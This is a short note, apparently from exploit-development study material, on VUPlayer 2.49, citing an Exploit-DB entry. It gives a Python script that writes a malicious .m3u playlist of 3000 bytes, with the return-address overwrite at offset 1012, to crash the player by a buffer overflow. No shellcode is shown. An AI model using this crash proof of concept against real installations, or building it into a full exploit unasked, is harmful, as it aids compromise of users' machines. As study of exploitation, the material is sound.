# VUPlayer 2.49

Downloaded from: https://www.exploit-db.com/exploits/40018

## Initial Crash
```py
import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

#\x00\x09\x0a\x0d\x1a
fuzz = "A" * 1012
fuzz += "B" * 4
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()
```
